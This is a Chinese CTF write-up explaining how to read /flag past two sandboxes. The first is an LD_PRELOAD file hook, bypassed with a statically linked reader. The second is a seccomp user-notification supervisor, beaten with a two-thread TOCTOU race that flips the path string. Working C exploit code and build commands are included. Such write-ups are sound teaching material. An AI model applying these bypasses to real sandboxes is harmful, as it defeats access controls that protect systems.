# 为什么要打开 /flag 😡

## 题目简述

题目接收一个 Base64 编码的 Linux ELF，以低权限用户执行。第一阶段通过 `LD_PRELOAD` 劫持常见文件函数，把路径中含 `flag` 的访问重定向到假 flag；第二阶段改用 seccomp user notification，在 `open/openat` 执行前检查目标进程提供的路径，并对命中的访问注入假文件描述符。

两关都要求绕过进程执行边界上的文件访问限制：第一关绕过用户态函数插桩，第二关构造检查与使用之间的竞争条件，决定性原语属于 pwn。

## 解题过程

### 第一阶段：让 `LD_PRELOAD` 没有插入点

拦截库覆盖了 `fopen`、`open`、`openat` 等 libc 接口，但它只能影响动态链接过程中解析到的符号。把读取程序静态链接后，动态加载器不会装入 `/stage1.so`，程序内的 `open` 实现也不会跳到预加载库。

```c
#include <fcntl.h>
#include <unistd.h>

int main(void) {
    char buf[256];
    int fd = open("/flag", O_RDONLY);
    if (fd < 0) return 1;
    ssize_t n = read(fd, buf, sizeof(buf));
    if (n > 0) write(STDOUT_FILENO, buf, (size_t)n);
    close(fd);
    return 0;
}
```

```bash
gcc -O2 -static read-flag.c -o read-flag
base64 -w0 read-flag
```

在 x86-64 上直接执行 `syscall` 调用 `open`/`openat` 也能绕过 libc 插桩；静态链接方案更直观。重点并不是换一个未被包装的函数名，而是根本不经过被 `LD_PRELOAD` 替换的动态符号。

### 第二阶段：利用 seccomp user notification 的 TOCTOU

监督器拦截 `open/openat` 后，从通知参数取得目标进程中的路径指针，再用 `process_vm_readv` 复制最多 256 字节进行检查。若副本含 `flag`，监督器就把 `/fakeflag` 的文件描述符注入目标；否则回复 `SECCOMP_USER_NOTIF_FLAG_CONTINUE`，让内核继续原来的系统调用。

问题在于监督器检查的是某一时刻复制出的字符串，而内核继续系统调用时会再次从目标地址读取路径。两个动作之间没有锁定目标内存。让两个线程共享同一个路径缓冲区：

```c
static volatile char path[] = "/alag";

static void *flip_path(void *unused) {
    (void)unused;
    for (;;) {
        path[1] = 'f';  /* /flag */
        path[1] = 'a';  /* /alag */
    }
}

static void *try_open(void *unused) {
    (void)unused;
    char buf[256];
    for (;;) {
        int fd = open((const char *)path, O_RDONLY);
        if (fd < 0) continue;
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n > 0) write(STDOUT_FILENO, buf, (size_t)n);
        close(fd);
    }
}
```

主线程创建两个线程并持续运行。当监督器看到 `/alag` 时会允许系统调用继续；若内核真正复制路径前另一个线程把字符改成 `f`，实际打开的就是 `/flag`。反过来的竞争只会得到不存在文件或假 flag，多次重试即可命中目标时序。

过滤器允许传统 `clone`，但不允许 `clone3`。为避免较新的 glibc `pthread_create` 优先尝试 `clone3`，可使用 musl 静态链接：

```bash
musl-gcc -O2 -static -pthread race.c -o race
base64 -w0 race
```

拿到任意文件描述符都应及时关闭，否则高频失败与假文件打开会耗尽描述符。实际程序还应检查输出内容，仅在读到真实 flag 后退出。

## 方法总结

第一阶段说明 `LD_PRELOAD` 是动态链接层的策略，不是系统调用级沙箱；静态链接或直接系统调用都能越过它。第二阶段的根因则是监督器把不可信进程内存当成稳定参数：检查副本后再让内核使用原指针，形成经典 TOCTOU。利用时需要共享可变缓冲区、高频并发重试，并兼顾 seccomp 对线程创建系统调用的限制。
